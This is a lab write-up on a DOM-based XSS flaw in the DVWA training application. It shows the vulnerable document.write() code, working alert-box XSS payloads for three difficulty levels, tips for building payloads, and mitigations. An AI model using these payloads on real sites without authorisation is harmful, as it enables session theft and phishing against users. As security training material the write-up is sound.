
# 🛡️ DOM-based XSS Vulnerability — DVWA

## 📌 Overview

This analysis focuses on a **DOM-based Cross-Site Scripting (XSS)** vulnerability in DVWA where user-controlled input is directly embedded into the page using JavaScript, specifically via the `document.write()` function. The vulnerable JavaScript reads the URL parameter and injects it into the HTML DOM without any proper sanitization, encoding, or validation.

---

## 🔍 Vulnerabilities Identified

```python
🔒 Vulnerability | ❌ Problem Description  
---|---  
DOM-Based XSS | Unvalidated input from URL `default=` parameter is directly written into the DOM using `document.write()`  
Tag Injection | Input is injected inside the `<option value='...'>` and innerText, enabling tag-breaking or full HTML injection  
Lack of Encoding | No encoding of attribute or text content, enabling direct script injection
```

---

## 🔢 Input Code (DOM Sink)

```html
<script>
    if (document.location.href.indexOf("default=") >= 0) {
        var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
        document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
        document.write("<option value='' disabled='disabled'>----</option>");
    }
    document.write("<option value='English'>English</option>");
    document.write("<option value='French'>French</option>");
    document.write("<option value='Spanish'>Spanish</option>");
    document.write("<option value='German'>German</option>");
</script>
```

---

## 2️⃣ Exploitation Phase: Manual

### 🔨 Tool:
- Web Browser + URL bar
- Burp Suite (optional)

### 🔧 Setup:
- Access: `http://localhost/vulnerabilities/xss_d/`
- Payloads injected via `default=` URL parameter

### 🔁 Payloads:

#### Low
```text
?default=');<script>alert('hacked!');</script>//
```

#### Medium (script tag filtered, attribute-based attack):
```text
?default=English</option></select><img src='x' onerror='alert(1)'>
```

#### High (hash-based DOM parsing):
```text
?default=English#<script>alert('hacked')</script>
```

### 🎯 Success Indicator:
- A JavaScript alert box pops up
- DOM is modified to include the attacker's input

### 📸 Screenshot:
- Screenshot the alert or console DOM view after injection

---

## 4️⃣ Risk & Real-World Impact

```sql
🧠 Exploit Impact | 🎯 Description  
---|---  
Credential Theft | Can be used to steal session cookies via JavaScript  
Phishing | Malicious UI injected into the page  
Keylogging | Scripts can record user input  
Session Hijack | Attackers could hijack user sessions with stolen cookies
```

---

## 5️⃣ 🚧 Mitigation Measures (Secure Coding)

```sql
🚫 Vulnerability | ✅ Mitigation  
---|---  
Unescaped Input | Avoid using `document.write()` with untrusted input  
Improper Context Use | Use `textContent` or DOM methods like `createTextNode`  
Lack of Allowlisting | Implement strict allowlists for expected values (e.g., language enums)  
Missing CSP | Use Content Security Policy to block inline scripts
```

---

## 📘 Learning Note

When building payloads for DOM XSS:
- Analyze **where in the HTML** the input is injected (attribute, tag, script, etc.)
- Use **tag-breaking** if inside HTML: inject `'><script>...`
- Use **event handlers** like `<img src=x onerror=...>` if `<script>` is blocked
- Use the browser DevTools or View Source to **see final rendered DOM**

---

## 🔚 Conclusion

DOM-based XSS is dangerous because it's **invisible to server logs** and **bypasses many traditional WAFs**. Developers must validate and encode user input **before** inserting it into the DOM, especially when using `document.write`, `innerHTML`, or URL-derived data.

